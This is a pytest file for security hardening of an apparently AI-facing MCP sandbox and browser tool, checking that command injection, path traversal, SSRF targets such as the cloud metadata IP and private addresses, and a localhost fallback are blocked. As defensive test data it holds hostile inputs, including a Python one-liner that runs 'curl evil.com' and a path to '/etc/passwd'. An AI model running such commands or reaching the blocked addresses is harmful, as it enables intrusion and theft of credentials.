"""Tests for browser tools MCP security hardening (section-02).

Covers F22 (command injection), F23 (domain SSRF blocklist), F24 (localhost fallback).
"""

from unittest.mock import AsyncMock, MagicMock, patch

import pytest

pytestmark = [pytest.mark.unit]


class TestCommandInjection:
    """F22: Full command validation, not just first word."""

    @pytest.mark.asyncio
    async def test_blocks_eval_flag(self):
        """Commands with -e or --eval flags are blocked."""
        from app.mcp.browser_tools_mcp import handle_sandbox_exec_command, ToolError

        with pytest.raises(ToolError) as exc_info:
            await handle_sandbox_exec_command(
                'python -c "import os; os.system(\'curl evil.com\')"',
                user_id=1, tenant_id="t1",
            )
        assert "not allowed" in exc_info.value.message.lower()

    @pytest.mark.asyncio
    async def test_blocks_node_eval(self):
        """Node with --eval is blocked despite 'node' being in allowlist."""
        from app.mcp.browser_tools_mcp import handle_sandbox_exec_command, ToolError

        with pytest.raises(ToolError) as exc_info:
            await handle_sandbox_exec_command(
                "node -e 'process.exit(1)'",
                user_id=1, tenant_id="t1",
            )
        assert "not allowed" in exc_info.value.message.lower()

    @pytest.mark.asyncio
    async def test_blocks_path_traversal_in_args(self):
        """Path traversal in command arguments is blocked."""
        from app.mcp.browser_tools_mcp import handle_sandbox_exec_command, ToolError

        with pytest.raises(ToolError) as exc_info:
            await handle_sandbox_exec_command(
                "python ../../etc/passwd",
                user_id=1, tenant_id="t1",
            )
        assert "not allowed" in exc_info.value.message.lower() or "traversal" in exc_info.value.message.lower()

    @pytest.mark.asyncio
    async def test_allows_simple_command(self):
        """Simple allowed command without dangerous flags passes validation."""
        from app.mcp.browser_tools_mcp import handle_sandbox_exec_command

        mock_dispatcher = MagicMock()
        mock_dispatcher.dispatch = AsyncMock(return_value="job-123")

        mock_db = MagicMock()
        mock_db.__aenter__ = AsyncMock(return_value=MagicMock())
        mock_db.__aexit__ = AsyncMock(return_value=False)

        with (
            patch("app.core.database.get_db_context", return_value=mock_db),
            patch("app.services.sandbox_dispatcher.SandboxDispatcher", return_value=mock_dispatcher),
        ):
            result = await handle_sandbox_exec_command(
                "python script.py",
                user_id=1, tenant_id="t1",
            )
        assert result["status"] == "dispatched"


class TestDomainValidation:
    """F23: allowed_domains must be validated against SSRF blocklist."""

    @pytest.mark.asyncio
    async def test_blocks_localhost_domain(self):
        """localhost in allowed_domains is rejected."""
        from app.mcp.browser_tools_mcp import _validate_domains

        result = _validate_domains(["localhost", "example.com"])
        assert "localhost" not in result
        assert "example.com" in result

    @pytest.mark.asyncio
    async def test_blocks_metadata_ip(self):
        """Cloud metadata IP in allowed_domains is rejected."""
        from app.mcp.browser_tools_mcp import _validate_domains

        result = _validate_domains(["169.254.169.254", "github.com"])
        assert "169.254.169.254" not in result
        assert "github.com" in result

    @pytest.mark.asyncio
    async def test_blocks_private_ip(self):
        """Private IPs in allowed_domains are rejected."""
        from app.mcp.browser_tools_mcp import _validate_domains

        result = _validate_domains(["192.168.1.1", "10.0.0.1", "example.com"])
        assert "192.168.1.1" not in result
        assert "10.0.0.1" not in result
        assert "example.com" in result

    @pytest.mark.asyncio
    async def test_allows_valid_public_domains(self):
        """Valid public domains pass validation."""
        from app.mcp.browser_tools_mcp import _validate_domains

        result = _validate_domains(["example.com", "github.com"])
        assert result == ["example.com", "github.com"]


class TestLocalhostFallback:
    """F24: Missing SMARTSPEC_WEB_GATEWAY_URL must raise error, not fallback."""

    @pytest.mark.asyncio
    async def test_missing_gateway_url_raises_error(self):
        """Missing SMARTSPEC_WEB_GATEWAY_URL raises ToolError, not fallback to localhost."""
        from app.mcp.browser_tools_mcp import handle_browser_execute_actions, ToolError

        with patch("app.mcp.browser_tools_mcp.settings") as mock_settings:
            mock_settings.SMARTSPEC_WEB_GATEWAY_URL = ""
            mock_settings.SMARTSPEC_WEB_GATEWAY_TOKEN = "valid-token"

            with pytest.raises(ToolError) as exc_info:
                await handle_browser_execute_actions(
                    allowed_domains=["example.com"],
                    actions=[{"type": "navigate", "url": "https://example.com"}],
                    user_id=1, tenant_id="t1",
                )
            assert "not configured" in exc_info.value.message.lower()
